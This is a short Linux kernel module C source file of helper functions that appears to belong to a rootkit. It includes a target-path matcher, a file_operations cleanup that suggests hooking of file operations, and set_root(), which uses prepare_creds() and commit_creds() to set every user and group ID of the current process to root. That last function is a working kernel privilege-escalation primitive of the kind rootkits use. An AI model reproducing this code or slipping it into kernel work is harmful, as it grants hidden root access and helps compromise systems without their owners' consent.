#include <linux/kernel.h>
#include <linux/file.h>
#include <linux/string.h>
#include <linux/types.h>
#include <linux/fs.h>
#include <linux/cred.h>
#include <linux/slab.h>

/* Cleanup fops struct*/
static void cleanup_fops(struct file_operations *fops) {
    kfree(fops);
}

/* Checks if path matches target */
bool is_bad_path(const char *full_path, const char *target, size_t n) {
    size_t fp_len;
    size_t t_len;
    if (!full_path || !target) {
        return true; // pointer is NULL
    }
    // simple bounds checking
    fp_len = strlen(full_path);
    t_len = strlen(target);

    if (n > fp_len || n > t_len) {
        return true;
    }

    return strncmp(full_path, target, n) != 0;
}

/* Checks if file descriptor (fd) is standard (STDOUT, STDERR, STDIN)*/
bool is_bad_fd(const int fd) {
    return fd < 3;
}

/* Set given credentials to root (does not commit creds for you!) */
void __set_root_creds(struct cred *cred) {
    cred->uid.val = cred->gid.val = 0;
    cred->euid.val = cred->egid.val = 0;
    cred->suid.val = cred->sgid.val = 0;
    cred->fsuid.val = cred->fsgid.val = 0;
}

/* Wrapper for __set_root_creds */
void set_root(void)
{
    struct cred *root;
    root = prepare_creds();

    if (root != NULL) {
        // Set credentials to root
        __set_root_creds(root);
        commit_creds(root);
    }
}